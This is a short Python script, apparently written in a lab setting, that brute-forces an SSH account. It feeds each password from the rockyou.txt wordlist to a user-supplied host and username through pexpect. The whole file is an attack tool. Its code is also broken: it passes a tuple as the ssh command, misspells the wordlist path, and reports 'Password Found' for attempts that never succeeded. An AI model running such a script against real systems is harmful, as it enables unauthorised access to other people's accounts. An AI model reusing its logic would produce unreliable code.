
#!/usr/bin/python

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']	# prompt was missing error 1 now resolved

def connect(user,host,password):
        ssh_newkey = 'Are you sure you want to continuew connecting'
        connStr = 'ssh', user , '@', host       # ssh msfadmin@192.168.1.5
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:' ])
        if ret == 0:
                print("error connecting")
        if ret == 1:
                child.sendline('yes')
                ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:' ])
                if ret == 0:
                        print('error connecting')
                        return
                child.sendline(password)
                child.expect(PROMPT,timeout=0.5)	# too fast to establish the connection error 2 now resolved
                return child				# timeout is 0.5 sec

def main():
	host = input("Enter the Target IP Address to Bruteforce: ")
	user = input("Enter The user account you want to Bruteforce: ")
	file = open('/use/share/wordlists/rockyou.txt', 'r')
	for password in file.readlines(): # it will read the file line by line and
		password = password.strip('\n')
		try:
			child = connect(user, host, password)
			print("Password Found: ", password)
		except:
			print("Wrong Password", password)

main()
